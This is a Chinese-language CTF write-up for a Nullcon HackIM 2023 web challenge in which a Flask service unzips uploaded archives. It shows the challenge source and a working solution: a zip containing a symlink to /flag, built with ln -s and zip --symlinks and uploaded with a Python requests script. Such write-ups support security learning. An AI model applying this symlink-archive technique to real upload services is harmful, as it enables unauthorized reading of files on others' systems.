题目说明：My colleague built a service which shows the contents of a zip file. He says there's nothing to worry about....
附件：

```yml
version: "3.1"
services:
  zpr:
    build:
      context: .
      dockerfile: Dockerfile.app
    volumes:
      - ./code:/app
      - shared_data:/tmp/data
    ports:
      - 10015:8080
    links:
      - serve
    depends_on:
      - serve
  serve:
    build:
      context: .
      dockerfile: Dockerfile.serve
    ports:
      - 10016:8088
    volumes:
      - ./code:/app
      - ./flag:/flag:ro
      - shared_data:/tmp/data
volumes:
  shared_data:
```

可以看到 /flag 目录就在根目录下

```py
from flask import Flask, Response, request
from werkzeug.utils import secure_filename
from subprocess import check_output
import io
import hashlib
import secrets
import zipfile
import os
import random
import glob

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 1.5 * 1000  # 1kb


@app.route("/", methods=["GET"])
def index():
    output = io.StringIO()
    output.write(
        "Send me your zipfile as a POST request and I'll make them accessible to you ;-0."
    )

    return Response(output.getvalue(), mimetype="text/plain")


@app.route("/", methods=["POST"])
def upload():
    output = io.StringIO()
    if "file" not in request.files:
        output.write("No file provided!\n")
        return Response(output.getvalue(), mimetype="text/plain")

    try:
        file = request.files["file"]

        filename = hashlib.md5(secrets.token_hex(8).encode()).hexdigest()
        dirname = hashlib.md5(filename.encode()).hexdigest()

        dpath = os.path.join("/tmp/data", dirname)
        fpath = os.path.join(dpath, filename + ".zip")

        os.mkdir(dpath)
        file.save(fpath)

        with zipfile.ZipFile(fpath) as zipf:
            files = zipf.infolist()
            if len(files) > 5:
                raise Exception("Too many files!")

            total_size = 0
            for the_file in files:
                if the_file.file_size > 50:
                    raise Exception("File too big.")

                total_size += the_file.file_size

            if total_size > 250:
                raise Exception("Files too big in total")

        check_output(["unzip", "-q", fpath, "-d", dpath])

        g = glob.glob(dpath + "/*")
        for f in g:
            output.write("Found a file: " + f + "\n")

        output.write("Find your files at http://...:8088/" + dirname + "/\n")

    except Exception as e:
        output.write("Error :-/\n")

    return Response(output.getvalue(), mimetype="text/plain")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port="8080", debug=True)

```

app.py 我们应该 post 发送一个 zip 文件，上传后会放在一个文件夹内，命名不可预测，文件将在目录下解压

```py
from functools import partial
import http.server
import re

PORT = 8088
HOST = "0.0.0.0"

http.server.SimpleHTTPRequestHandler._orig_list_directory = (
    http.server.SimpleHTTPRequestHandler.list_directory
)


def better_list_directory(self, path):
    if not re.match(r"^/tmp/data/[0-9a-f]{32}", path):
        return None
    else:
        return self._orig_list_directory(path)


http.server.SimpleHTTPRequestHandler.list_directory = better_list_directory


Handler = partial(http.server.SimpleHTTPRequestHandler, directory="/tmp/data/")
Server = http.server.ThreadingHTTPServer


with Server((HOST, PORT), Handler) as httpd:
    httpd.serve_forever()

```

我们可以访问上面生成的那个文件，限制了 path 为/tmp/data/生成的目录名 的格式，所以并不能直接访问到 flag 目录

参考解答：
[Nullcon-HackIM-CTF-2023-writeups/README.md at main · Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups (github.com)](https://github.com/Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups/blob/main/README.md)

用到了软链接的一些特性： 1.软链接，以路径的形式存在。类似于 Windows 操作系统中的快捷方式 2.软链接可以 跨文件系统 3.软链接可以对一个不存在的文件名进行链接 4.软链接可以对目录进行链接

```
ln [参数][源文件或目录][目标文件或目录]
```

对于 zip 命令，有一个-y

```
zip [-AcdDfFghjJKlLmoqrSTuvVwXyz$][-b <工作目录>][-ll][-n <字尾字符串>][-t <日期时间>][-<压缩效率>][压缩文件][文件...][-i <范本样式>][-x <范本样式>]

-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。
```

根据以上特性，我们可以创造一个指向/flag 目录的软链接 然后压缩时保存符号连接
上传后解压，即可访问到/flag

构造 zip 包

```
ln -s /flag flag.txt
zip --symlinks flag.zip flag.txt
```

python 构造并发送请求

```
import requests

url="http://52.59.124.14:10015"
files={"file":open("C:/Users/24047/Desktop/flag.zip","rb")}
res=requests.post(url,files=files)
print(res.text)
```

最后访问 falg.txt 即可

参考：
[Linux 命令大全 | 菜鸟教程 (runoob.com)](https://www.runoob.com/linux/linux-command-manual.html)
[Nullcon-HackIM-CTF-2023-writeups/README.md at main · Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups (github.com)](https://github.com/Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups/blob/main/README.md)
